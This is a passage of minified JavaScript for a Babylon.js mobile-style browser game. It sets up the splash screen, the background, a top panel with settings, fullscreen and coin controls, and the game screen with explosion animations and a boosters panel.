0;this.imgInlogicSplash.domImage=AssetLoader.instance.loadedImages["main_bg.jpg"];a.addControl(this.imgInlogicSplash);this.imgInlogicLogo=new BABYLON.GUI.Image;this.imgInlogicLogo.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;this.imgInlogicLogo.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.imgInlogicLogo.isPointerBlocker=!1;this.imgInlogicLogo.isHitTestVisible=!1;this.imgInlogicLogo.topInPixels=0;this.imgInlogicLogo.alpha=0;this.imgInlogicLogo.domImage=AssetLoader.instance.loadedImages["logo_big.png"];
a.addControl(this.imgInlogicLogo);this.imgInlogicLogo.isVisible=!1;var b=800;setTimeout(function(){CommonAnimations.AnimateObjectProperty(this.imgInlogicLogo,"alpha",1,b,null,1,!1,function(){setTimeout(function(){loadGameAssets();b=400;CommonAnimations.AnimateObjectProperty(this.imgInlogicSplash,"alpha",0,b,null,1,!1);CommonAnimations.AnimateObjectProperty(this.imgInlogicLogo,"alpha",0,b,null,1,!1,function(){this.imgInlogicSplash.isVisible=!1;this.imgInlogicLogo.isVisible=!1}.bind(this))}.bind(this),
1E3)}.bind(this))}.bind(this),150);this.guiRoot=this.imgSplash.parent},allAssetsLoaded:function(){this.txtContinue.text=STR("TAP_TO_CONTINUE");CommonAnimations.AnimateObjectProperty(this.txtContinue,"alpha",.8,800,null,1,!0,null,[[0,1],[.5,.9],[1,1]]);this.pnlBackground.onPointerClickObservable.add(function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint({adType:AD_TYPES.GAME_LOADED}),Buttons.enabled=!1,BABYLON.Engine.audioEngine.unlocked||BABYLON.Engine.audioEngine.unlock(),soundManager.playSound("button"),
this.imgInlogicSplash.isVisible?Buttons.enabled=!0:(screenTopPanel.showScene(),soundManager.playMusic("music_menu"),screenBackground.guiRoot.isVisible=!0,screenGame.guiRoot.isVisible=!0,soundManager.stopMusic("music_menu"),Buttons.enabled=!0,screenGame.rootNode.setEnabled(!0),screenGame.resetGame(),screenGame.updateData(),soundManager.playMusic("music_ingame"),Buttons.enabled=!1,this.hideScene(function(){Buttons.enabled=!0;screenGame.gameStep_start()})))}.bind(this));setTimeout(function(){Buttons.enabled=
!0},500)},createContinueText:function(){var a=new BABYLON.GUI.TextBlock;a.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;a.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;a.color="#ffffff";a.text=" ";a.fontSize="50px";a.fontFamily="gamefont";a.isPointerBlocker=!1;a.isHitTestVisible=!1;a.shadowOffsetX=0;a.shadowOffsetY=6;a.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0)":"rgba(80,80,80,0)";a.outlineColor="rgb(0,0,0)";a.outlineWidth=3;a.shadowBlur=6;return a},dispose:function(){this.camera.dispose();
this.imgSplash.dispose();this.imgLogo.dispose();this.txtContinue.dispose();this.guiTexture.dispose();this.guiTexture=null;this.rootNode.dispose()},hideScene:function(a){void 0===a&&(a=null);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,250,BABYLON.CubicEase,2,!1,function(){screenSplash.dispose();activeScene.removeScreen(screenSplash);null!=a&&a()})},onResize:function(){if(null!=screenSplash.guiTexture&&this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();
this.imgInlogicLogo.heightInPixels=.2*b;this.imgInlogicLogo.widthInPixels=this.imgInlogicLogo.heightInPixels/this.imgInlogicLogo.domImage.naturalHeight*this.imgInlogicLogo.domImage.naturalWidth;this.imgInlogicLogo.widthInPixels>.7*a&&(this.imgInlogicLogo.widthInPixels=.7*a,this.imgInlogicLogo.heightInPixels=this.imgInlogicLogo.widthInPixels/this.imgInlogicLogo.domImage.naturalWidth*this.imgInlogicLogo.domImage.naturalHeight);this.imgInlogicLogo.topInPixels=.5*b-this.imgInlogicLogo.heightInPixels/
2;this.imgInlogicLogo.leftInPixels=.5*a-this.imgInlogicLogo.widthInPixels/2;this.pnlBackground.widthInPixels=a;this.pnlBackground.heightInPixels=b;this.imgLogo.topInPixels=.05*b;this.imgLogo.leftInPixels=.05*a;a>b?(this.imgLogo.widthInPixels=.4*a,this.imgLogo.heightInPixels=this.imgLogo.widthInPixels/this.imgLogo.domImage.naturalWidth*this.imgLogo.domImage.naturalHeight,this.imgLogo.heightInPixels<.3*b&&(this.imgLogo.heightInPixels=.3*b,this.imgLogo.widthInPixels=this.imgLogo.heightInPixels/this.imgLogo.domImage.naturalHeight*
this.imgLogo.domImage.naturalWidth),updateTextToWidth(this.txtContinue,screenSplash.guiTexture.getContext(),.5*a,50,3),this.imgSplash.heightInPixels=b,this.imgSplash.widthInPixels=this.imgSplash.heightInPixels/this.imgSplash.domImage.naturalHeight*this.imgSplash.domImage.naturalWidth,this.imgSplash.widthInPixels<a&&(this.imgSplash.widthInPixels=a,this.imgSplash.heightInPixels=this.imgSplash.widthInPixels/this.imgSplash.domImage.naturalWidth*this.imgSplash.domImage.naturalHeight)):(this.imgLogo.heightInPixels=
.3*b,this.imgLogo.widthInPixels=this.imgLogo.heightInPixels/this.imgLogo.domImage.naturalHeight*this.imgLogo.domImage.naturalWidth,this.imgLogo.widthInPixels>a/1.08&&(this.imgLogo.widthInPixels=a/1.08,this.imgLogo.heightInPixels=this.imgLogo.widthInPixels/this.imgLogo.domImage.naturalWidth*this.imgLogo.domImage.naturalHeight),updateTextToWidth(this.txtContinue,screenSplash.guiTexture.getContext(),.95*a,50,3),this.imgSplash.widthInPixels=a,this.imgSplash.heightInPixels=this.imgSplash.widthInPixels/
this.imgSplash.domImage.naturalWidth*this.imgSplash.domImage.naturalHeight,this.imgSplash.heightInPixels<b&&(this.imgSplash.heightInPixels=b,this.imgSplash.widthInPixels=this.imgSplash.heightInPixels/this.imgSplash.domImage.naturalHeight*this.imgSplash.domImage.naturalWidth));this.imgInlogicSplash.heightInPixels=this.imgSplash.heightInPixels;this.imgInlogicSplash.widthInPixels=this.imgSplash.widthInPixels;this.txtContinue.topInPixels=.4*b;this.txtContinue.fontSize=55*Resolution.SCALE;this.resizeShadows()}},
resizeShadows:function(){var a=this.txtContinue._fontSize._value/55;this.txtContinue.shadowOffsetX=getShadowOffs(0);this.txtContinue.shadowOffsetY=getShadowOffs(3*a);this.txtContinue.outlineWidth=7*a}};var MAX_FLYING_OBJECTS=6,ScreenBackground=function(a){ScreenBackground.instance=this;this.create(a)};ScreenBackground.instance=null;
ScreenBackground.prototype={create:function(a){this.scene=a;this.rootNode=new BABYLON.TransformNode("ScreenBackground");this.createCamera();this.createGui();this.guiRoot.isVisible=!1},createCamera:function(){this.camera=new BABYLON.FreeCamera("camera",new BABYLON.Vector3(0,0,-10),this.scene);this.camera.setTarget(new BABYLON.Vector3(0,0,0));this.camera.mode=BABYLON.Camera.ORTHOGRAFIC_CAMERA;this.camera.orthoTop=1;this.camera.orthoBottom=-1;this.camera.orthoLeft=-2;this.camera.orthoRight=2;this.camera.layerMask=
LAYER_SCREEN_BACKGROUND;this.camera.parent=this.rootNode;this.camera.viewport=new BABYLON.Viewport(0,0,1,1)},createGui:function(){this.guiTexture=BABYLON.GUI.AdvancedDynamicTexture.CreateFullscreenUI("ScreenBackground");this.guiTexture.layer.layerMask=LAYER_SCREEN_BACKGROUND;this.guiTexture.rootContainer.highlightLineWidth=0;this.initGuiControls(this.guiTexture)},initGuiControls:function(a){this.createRootPanel(a);this.createBackground(this.pnlRoot)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenBackground.pnlRoot");
this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.clipChildren=!0;this.pnlRoot.clipContent=!0;this.pnlRoot.isVisible=!0;a.addControl(this.pnlRoot);this.guiRoot=this.pnlRoot},createBackground:function(a){this.imgBackground=new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=
.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgb(118, 129, 151)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){this.widthInPixels=b+5;this.heightInPixels=e+5}},beforeRender:function(){},onResize:function(){var a=engine.getRenderWidth(),
b=engine.getRenderHeight();autoResizeOrthographicCamera(this.camera,1);this.imgBackground.resize(a,b)}};var ScreenTopPanel=function(a){ScreenTopPanel.instance=this;this.create(a)};ScreenTopPanel.instance=null;
ScreenTopPanel.prototype={create:function(a){this.scene=a;this.PANELS_THICKNESS=1;this.createGui();this.enableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createTopPanel(this.pnlRoot);this.createSettingsButton(this.pnlTop);this.createCoinsPanel(this.pnlTop,10,0);fullscreenAvail()&&this.createFullscreenButton(this.pnlTop);GameData.BuildDebug&&this.createVersionInfo()},createRootPanel:function(a){this.pnlRoot=
new BABYLON.GUI.Rectangle("ScreenTopPanel.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=5;a.addControl(this.pnlRoot);return this.pnlRoot},createTopPanel:function(a){this.pnlTop=new BABYLON.GUI.Rectangle("pnlTop");this.pnlTop.transformCenterX=.5;this.pnlTop.transformCenterY=
.5;this.pnlTop.isPointerBlocker=!1;this.pnlTop.isHitTestVisible=!1;this.pnlTop.leftInPixels=0;this.pnlTop.topInPixels=0;this.pnlTop.thickness=0;this.pnlTop.highlightLineWidth=0;this.pnlTop.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.pnlTop.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.pnlTop.heightInPixels=120;a.addControl(this.pnlTop);this.pnlTop.resize=function(b,e){var f=.09*e;e>b&&(f=.09*e);this.heightInPixels=f+10};return this.pnlTop},createSettingsButton:function(a){this.btnSettings=
BABYLON.GUI.Button.CreateImageOnlyButton("btnSettings");this.btnSettings.children[0].transformCenterY=.5;this.btnSettings.children[0].transformCenterX=0;this.btnSettings.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnSettings.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnSettings.transformCenterX=1;this.btnSettings.transformCenterY=0;this.btnSettings.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_RIGHT;this.btnSettings.verticalAlignment=
BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.btnSettings.topInPixels=14*Resolution.SCALE;this.btnSettings.leftInPixels=0;this.btnSettings.isHitTestVisible=!1;this.btnSettings.isFocusInvisible=!0;a.addControl(this.btnSettings);SetImageFromSpritesheet(this.btnSettings.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"settings_button.png");ResetGuiButtonAppearance(this.btnSettings,this.btnSettings.children[0].sourceWidth,this.btnSettings.children[0].sourceHeight);this.btnSettings.onPointerClickObservable.add(this.onSettingsPressed);
this.btnSettings.resize=function(b,e){this.scaleX=this.scaleY=ScreenTopPanel.instance.pnlTop.heightInPixels/140;this.topInPixels=-5*this.scaleY;this.leftInPixels=10*this.scaleX}},createFullscreenButton:function(a){this.btnFullscreen=BABYLON.GUI.Button.CreateImageOnlyButton("btnFullscreen");this.btnFullscreen.children[0].transformCenterY=.5;this.btnFullscreen.children[0].transformCenterX=0;this.btnFullscreen.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnFullscreen.children[0].verticalAlignment=
BABYLON.GUI.Control.VERTICAL_ALIGNMENT_LEFT;this.btnFullscreen.transformCenterX=0;this.btnFullscreen.transformCenterY=0;this.btnFullscreen.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;this.btnFullscreen.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.btnFullscreen.topInPixels=this.btnSettings.topInPixels;this.btnFullscreen.leftInPixels=0;this.btnFullscreen.isHitTestVisible=!1;this.btnFullscreen.isFocusInvisible=!0;a.addControl(this.btnFullscreen);SetImageFromSpritesheet(this.btnFullscreen.children[0],
getAssetImage("pak1"),getAssetImageFrames("pak1"),"resize_1.png");ResetGuiButtonAppearance(this.btnFullscreen,this.btnFullscreen.children[0].sourceWidth,this.btnFullscreen.children[0].sourceHeight);this.btnFullscreen.onPointerClickObservable.add(this.onFullscreenPressed.bind(this));this.btnFullscreen.resize=function(b,e){this.scaleX=this.scaleY=ScreenTopPanel.instance.btnSettings.scaleY;this.leftInPixels=-ScreenTopPanel.instance.btnSettings.leftInPixels;this.topInPixels=ScreenTopPanel.instance.btnSettings.topInPixels};
this.btnFullscreen.updateIcon=function(){fullscreenActive()?SetImageFromSpritesheet(this.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"resize_2.png"):SetImageFromSpritesheet(this.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"resize_1.png")}},createCoinsPanel:function(a,b,e){this.pnlCoins=new BABYLON.GUI.Rectangle("pnlCoins");this.pnlCoins.thickness=this.PANELS_THICKNESS;this.pnlCoins.color="yellow";this.pnlCoins.transformCenterY=0;this.pnlCoins.horizontalAlignment=
BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.pnlCoins.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.pnlCoins.leftInPixels=b;this.pnlCoins.topInPixels=e;this.pnlCoins.thickness=0;this.pnlCoins.heightInPixels=100;this.pnlCoins.widthInPixels=350;this.pnlCoins.isPointerBlocker=!1;this.pnlCoins.isHitTestVisible=!1;this.pnlCoins.clipContent=!1;this.pnlCoins.clipChildren=!1;a.addControl(this.pnlCoins);this.imgCoinsBG=new BABYLON.GUI.Image("imgCoinsBG");this.imgCoinsBG.transformCenterX=
.5;this.imgCoinsBG.transformCenterY=.5;this.imgCoinsBG.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgCoinsBG.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgCoinsBG.isPointerBlocker=!1;this.imgCoinsBG.isHitTestVisible=!1;this.imgCoinsBG.leftInPixels=0;this.imgCoinsBG.topInPixels=0;this.pnlCoins.addControl(this.imgCoinsBG);SetImageFromSpritesheet(this.imgCoinsBG,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coins_table.png");this.txtCoinsVal=
new BABYLON.GUI.TextBlock("txtCoinsVal");this.txtCoinsVal.textWrapping=!1;this.txtCoinsVal.shadowBlur=0;this.txtCoinsVal.transformCenterX=.5;this.txtCoinsVal.transformCenterY=.5;this.txtCoinsVal.leftInPixels=30;this.txtCoinsVal.topInPixels=-2;this.txtCoinsVal.fontFamily="gamefont";this.txtCoinsVal.fontSize=35;this.txtCoinsVal.color="white";this.txtCoinsVal.text="1523";this.txtCoinsVal.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtCoinsVal.isPointerBlocker=!1;this.txtCoinsVal.isHitTestVisible=
!1;this.pnlCoins.addControl(this.txtCoinsVal);this.pnlCoins.resize=function(f,h){this.scaleX=this.scaleY=.9*ScreenTopPanel.instance.btnSettings.scaleY;this.topInPixels=20*this.scaleY}},createVersionInfo:function(){this.txtVersion=new BABYLON.GUI.TextBlock;this.txtVersion.textWrapping=!0;this.txtVersion.leftInPixels=-5;this.txtVersion.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_RIGHT;this.txtVersion.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_BOTTOM;this.txtVersion.textHorizontalAlignment=
BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_RIGHT;this.txtVersion.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_BOTTOM;this.txtVersion.color="white";this.txtVersion.text=" v"+GameData.BuildVersion+" [ "+GameData.BuildString+" ]";this.txtVersion.outlineWidth=3;this.txtVersion.outlineColor="#333333EE";this.txtVersion.fontSize="17px";this.txtVersion.isPointerBlocker=!1;this.txtVersion.isHitTestVisible=!1;this.pnlRoot.addControl(this.txtVersion)},onSettingsPressed:function(){if(Buttons.enabled){Buttons.enabled=
!1;soundManager.playSound("button");screenGame.guiRoot.isVisible&&screenGame.disableControls();screenPurchaseBooster.guiRoot.isVisible&&screenPurchaseBooster.disableControls();screenTopPanel.hideScene();var a=screenSettings;a.savedActiveCameras=activeScene.scene.activeCameras;a.savedActiveCamera=activeScene.scene.activeCamera;a.savedCameraToUseForPointers=activeScene.scene.cameraToUseForPointers;activeScene.scene.activeCameras=[screenBackground.camera,screenGame.cameraPlayer];activeScene.scene.activeCamera=
screenGame.cameraPlayer;activeScene.scene.cameraToUseForPointers=screenGame.cameraPlayer;a.enableControls();a.wasPaused=activeScene.gamePaused;activeScene.gamePaused=!0;a.showScene(function(){Buttons.enabled=!0})}},onFullscreenPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),fullscreenToggle(),this.btnFullscreen.updateIcon())},incCash:function(a){PlayerCash+=a;GameData.Save();this.pnlCoins.resize(engine.getRenderWidth(),engine.getRenderHeight());a=this.pnlCoins.scaleX;CommonAnimations.AnimateObjectProperty(this.pnlCoins,
"scaleX",null,150,null,1,!1,null,[[0,1*a],[.5,.97*a],[1,1*a]]);CommonAnimations.AnimateObjectProperty(this.pnlCoins,"scaleY",null,150,null,1,!1,null,[[0,1*a],[.5,.97*a],[1,1*a]]);this.updateData()},purchaseForCash:function(a,b){void 0===b&&(b=!1);if(a>PlayerCash)return this.pnlCoins.resize(engine.getRenderWidth(),engine.getRenderHeight()),a=this.pnlCoins.scaleX,CommonAnimations.AnimateObjectProperty(this.pnlCoins,"scaleX",null,150,null,1,!1,null,[[0,1*a],[.5,.97*a],[1,1*a]]),CommonAnimations.AnimateObjectProperty(this.pnlCoins,
"scaleY",null,150,null,1,!1,null,[[0,1*a],[.5,.97*a],[1,1*a]]),soundManager.playSound("negative_buy"),!1;b||soundManager.playSound("buy");b=this.txtCoinsVal.transformedMeasure;screenParticles.particles.CreateMoneySpent(b.left+b.width/2-engineRenderWidth/2,b.top+b.height/2-engineRenderHeight/2,10);PlayerCash-=a;GameData.Save();this.updateData();return!0},animateEarnedCoins:function(a,b,e,f,h){void 0===h&&(h=450);var m=function(r){soundManager.playSound("coin");screenTopPanel.incCash(r.data.amount)},
k=Math.floor(a/5);a=k+a%5;for(var n=0;5>n;n++){var v=this.imgCoinsBG.transformedMeasure,w=v.left+.1*v.width-engineRenderWidth/2;v=v.top+v.height/2-engineRenderHeight/2;screenParticles.flyingSprites.CreateFlyingEarnedCoin(b+4*getRandomInt(10)*Resolution.SCALE,e+4*getRandomInt(10)*Resolution.SCALE,w,v,4>n?k:a,h,f,m)}},updateTexts:function(){},updateData:function(){this.txtCoinsVal.text=""+PlayerCash;updateTextToWidth(this.txtCoinsVal,screenGame.guiTexture.getContext(),250,45,1)},enableControls:function(){enableButton(this.btnSettings);
fullscreenAvail()&&enableButton(this.btnFullscreen)},disableControls:function(){disableButton(this.btnSettings);fullscreenAvail()&&disableButton(this.btnFullscreen)},showPlayerMoney:function(a){void 0===a&&(a=null);this.pnlCoins.isVisible=!0;CommonAnimations.AnimateObjectProperty(this.pnlCoins,"alpha",1,SCENE_TRANSITION_DURATION,BABYLON.CubicEase,2,!1,function(){null!=a&&a()})},hidePlayerMoney:function(a){void 0===a&&(a=null);CommonAnimations.AnimateObjectProperty(this.pnlCoins,"alpha",0,SCENE_TRANSITION_DURATION,
BABYLON.CubicEase,2,!1,function(){screenTopPanel.pnlCoins.isVisible=!1;null!=a&&a()})},hideScene:function(a){void 0===a&&(a=null);this.disableControls();CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,SCENE_TRANSITION_DURATION,BABYLON.CubicEase,2,!1,function(){null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.updateData();this.enableControls();this.onResize();CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,
BABYLON.CubicEase,2,!1,function(){null!=a&&a()})},beforeRender:function(){},updateCoinPanelScale:function(){engine.getRenderWidth();var a=engine.getRenderHeight();this.pnlCoins.scaleX=.35*a/this.pnlCoins.widthInPixels;this.pnlCoins.scaleY=this.pnlCoins.scaleX},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.pnlTop.resize(a,b);this.btnSettings.resize(a,b);this.pnlCoins.resize(a,b);fullscreenAvail()&&(this.btnFullscreen.resize(a,b),this.btnFullscreen.updateIcon());
GameData.BuildDebug&&(this.txtVersion.fontSize=20*this.btnSettings.scaleX);this.resizeShadows()}},resizeShadows:function(){}};var TEXT_SHADOWS_ENABLED=!0,PARKING_BLOCKS_VISIBLE=!1,POIS_VISIBLE=!1,QUEUE_VISIBLE=!1,BORDERS_VISIBLE=!1;const LAYER_SCREEN_BACKGROUND=268435455,LAYER_SCREEN_PARTICLES=268435456,LAYER_SCREEN_GAME=536870912,LAYER_SCREEN_MENU=1073741824,LAYER_SCREEN_RESULT=2147483648,LAYER_SCREEN_SETTINGS=2147483648,GAME_OVER_DELAY=3500,FRICTION_GROUND=.5,RESTITUTION_GROUND=.4,GRID_WIDTH=23,GRID_HEIGHT=23,GRID_SIZE=1,CUBE_SIZE=GRID_SIZE-.15,CUBE_MODEL_SCALE=1.15;
var SHADOWS_ENABLED=!0,SHADOW_RES=512,MAN_SCALE=.9,MAN_SPEED=.15,BUS_SPEED=.4,BUS_ROTATION_SPEED=15,STEP_PEOPLE_IN_QUEUE=.48,BUS_TO_GO_DELAY=100,HOPIN_DELAY=80,BUS_MODEL_SCALE=.0055,DURATION_BOOSTER_SHAKE=250,MAN_ANIM_DELAY=100;const GRAVITY=new BABYLON.Vector3(0,-9.81,0);var v3=function(a,b,e){return new BABYLON.Vector3(a,b,e)},v4=function(a,b,e,f){return new BABYLON.Vector4(a,b,e,f)},collidersVisible=!0,ScreenGame=function(a){ScreenGame.instance=this;this.create(a)};ScreenGame.instance=null;
ScreenGame.prototype={create:function(a){this.scene=a;this.rootNode=new BABYLON.TransformNode("ScreenGame");this.createCamera();this.createMaterials();this.createGui();this.initLevel();this.disableControls();this.keyboardSpacePressed=this.guiRoot.isVisible=!1;this.collectedGifts=0;this.rootNode.setEnabled(!1)},createGui:function(){this.guiTexture=BABYLON.GUI.AdvancedDynamicTexture.CreateFullscreenUI("ScreenGame");this.guiTexture.layer.layerMask=this.cameraPlayer.layerMask;this.guiTexture.rootContainer.highlightLineWidth=
0;this.guiTexture.onControlPickedObservable.add(function(a){});this.initGuiControls(this.guiTexture)},createDemoTxts:function(){this.txtDemoHore=new BABYLON.GUI.TextBlock("txtDemoHore");this.txtDemoHore.textWrapping=!1;this.txtDemoHore.topInPixels=.51*-Resolution.HEIGHT;this.txtDemoHore.widthInPixels=2*Resolution.WIDTH;this.txtDemoHore.verticalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtDemoHore.horizontalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtDemoHore.color=
"#FFFFFF";this.txtDemoHore.text="DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO DEMO";this.txtDemoHore.fontSize="25px";this.txtDemoHore.fontFamily="gamefont";this.txtDemoHore.isPointerBlocker=!1;this.txtDemoHore.isFocusInvisible=!0;this.pnlRoot.guiTexture.addControl(this.txtDemoHore)},initGuiControls:function(a){this.createRootPanel(a);this.pnlRoot.topInPixels=-50;this.createBoostersPanel(this.pnlRoot);this.createOverlay(this.pnlRoot);
this.boosterRockets=[]},createAnimatedPlanes:function(){this.animatedPlanes=[];for(var a=0;5>a;a++)this.animatedPlanes[a]=this.createAnimatedPlane(this.explosionMaterial,"expl","expl_1.png expl_2.png expl_3.png expl_4.png expl_5.png expl_6.png expl_7.png expl_8.png expl_9.png expl_10.png expl_11.png expl_12.png expl_13.png expl_14.png".split(" "))},updateAnimatedPlanes:function(a){for(var b=0;b<this.animatedPlanes.length;b++)this.animatedPlanes[b].animationStep(a)},createAnimatedPlane:function(a,
b,e){var f=BABYLON.Mesh.CreatePlane("plane",6,this.scene);f.setParent(this.rootNode);f.position.y=4;f.layerMask=LAYER_SCREEN_GAME;f.material=a;f.billboardMode=7;f.isVisible=!1;f.animPak=b;f.animFrames=e;f.animDelay=25;f.frameDelay=f.animDelay;f.activeFrame=0;f.animLoop=!1;f.animPaused=!1;f.animationStep=function(h){if(this.isVisible&&!this.animPaused&&(this.frameDelay-=h,!(0<=this.frameDelay))){this.frameDelay=this.animDelay;this.activeFrame++;if(this.activeFrame>=this.animFrames.length-1){if(!this.animLoop){this.isVisible=
!1;return}this.activeFrame=0}this.updateFrame()}};f.updateFrame=function(){this.isVisible&&SetTextureFromSpritesheet(this.material.diffuseTexture,getAssetImageFrames(this.animPak),this.animFrames[this.activeFrame])};f.reset=function(){this.activeFrame=0;this.animPaused=!1;this.isVisible=!0;this.updateFrame()};f.updateFrame();return f},playAnimatedPlane:function(a){for(var b=0;b<this.animatedPlanes.length;b++)this.animatedPlanes[b].isVisible||(this.animatedPlanes[b].reset(),this.animatedPlanes[b].position=
v3(a.x,a.y,a.z))},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenGame.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.clipChildren=!1;this.pnlRoot.clipContent=!1;this.pnlRoot.zIndex=0;a.addControl(this.pnlRoot);this.guiRoot=this.pnlRoot},createBoostersPanel:function(a){this.imgBottomMask=
new BABYLON.GUI.Image("imgBottomMask");this.imgBottomMask.transformCenterX=.5;this.imgBottomMask.transformCenterY=.5;this.imgBottomMask.isPointerBlocker=!1;this.imgBottomMask.isHitTestVisible=!1;this.imgBottomMask.leftInPixels=0;this.imgBottomMask.topInPixels=0;this.imgBottomMask.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBottomMask.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_BOTTOM;SetImageFromSpritesheet(this.imgBottomMask,getAssetImage("pak1"),getAssetImageFrames("pak1"),
"void.png");a.addControl(this.imgBottomMask);this.imgBottomMask.onResize=function(b,e){this.widthInPixels=b;this.heightInPixels=.2*e};this.pnlBoosters=new BABYLON.GUI.Rectangle("pnlBooster");this.pnlBoosters.transformCenterX=.5;this.pnlBoosters.transformCenterY=0;this.pnlBoosters.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.pnlBoosters.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_TOP;this.pnlBoosters.isPointerBlocker=!1;this.pnlBoosters.isHitTestVisible=!1;
this.pnlBoosters.leftInPixels=0;this.pnlBoosters.topInPixels=0;this.pnlBoosters.thickness=0;this.pnlBoosters.color="green";this.pnlBoosters.widthInPixels=750;this.pnlBoosters.heightInPixels=170;this.pnlBoosters.highlightLineWidth=0;this.pnlBoosters.clipChildren=!1;this.pnlBoosters.clipContent=!0;this.pnlBoosters.isVisible=!0;a.addControl(this.pnlBoosters);this.pnlBoosters.scaleTo=function(b){this.scaleX=this.scaleY=b};this.pnlBoosters.setPosition=function(b,e){this.leftInPixels=b*Resolution.SCALE/
this.scaleX;this.topInPixels=e*Resolution.SCALE/this.scaleY};this.pnlBoosters.pnlSlots=[];this.pnlBoosters.itemWidth=1.5*this.pnlBoosters.heightInPixels;this.pnlBoosters.reset=function(){for(;0<this.pnlBoosters.pnlSlots.length;)this.pnlBoosters.pnlSlots[0].dispose(),this.pnlBoosters.pnlSlots.splice(0,1)};this.pnlBoosters.getBoosterByName=function(b){for(var e=0;e<this.pnlSlots.length;e++)if(this.pnlSlots[e].booster==b)return this.pnlSlots[e];return null};this.pnlBoosters.addBooster=function(b){var e=
